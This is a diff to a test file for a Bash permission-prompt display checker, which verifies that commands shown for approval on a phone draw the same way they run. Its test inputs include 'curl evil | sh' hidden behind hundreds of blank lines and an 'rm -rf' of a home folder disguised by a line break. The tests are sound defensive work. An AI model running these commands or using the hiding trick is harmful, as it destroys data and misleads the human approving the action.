@@ -1926,8 +1926,9 @@ for (const [name, tool, input] of [
   ['a command with an accented letter', 'Bash', { command: 'echo caf\u00e9' }],
   ['a command padded with blank lines', 'Bash', { command: `echo ok${'\n'.repeat(450)}curl evil | sh${'\n'.repeat(450)}` }],
   ['a command with one blank line', 'Bash', { command: 'echo ok\n\ncurl evil | sh' }],
-  ['a command of more than 20 lines', 'Bash', { command: Array.from({ length: 20 }, (_, i) => `echo ${i}`).join('\n') }],
-  ['a command with trailing spaces', 'Bash', { command: 'echo ok   \ncurl evil | sh' }],
+  // The final review's command: its line break draws just like a wrap, and it deletes the home folder.
+  ['a command with a line break', 'Bash', { command: 'rm -rf /Users/benny/\ntmp_build_artifacts_cache_2026' }],
+  ['a command with trailing spaces', 'Bash', { command: 'echo ok   ' }],
   ['a command that ends in a newline', 'Bash', { command: 'echo ok\n' }],
   ['a command with a tab, which can draw as a gap of a few pixels', 'Bash', { command: 'rm -rf ~/proj/build\t~' }],
   // The review's pair: a phone that wraps this line draws both the same.
@@ -1992,6 +1993,7 @@ test('the signed message matches the fixed example the gateway and the app check
     'walkie-permission|0123456789abcdef0123456789abcdef|fedcba9876543210fedcba9876543210|allow|de6f9c5a83c5800a7ae1db3f2af48c7ed0b1e932913f12ae8760726df14b1787',
   )
   expect(drawsAsItRuns('Allow Bash?\nls -l build')).toBe(true)
-  expect(drawsAsItRuns(Array.from({ length: 20 }, () => 'x'.repeat(30)).join('\n'))).toBe(true) // the limits exactly
+  expect(drawsAsItRuns(`${'x'.repeat(30)}\n${'x'.repeat(30)}`)).toBe(true) // the limits exactly
+  expect(drawsAsItRuns('Allow Bash?\nrm -rf /Users/benny/\ntmp_build_artifacts_cache_2026')).toBe(false)
   expect(drawsAsItRuns('Allow Bash?\n' + 'x'.repeat(31))).toBe(false)
 })
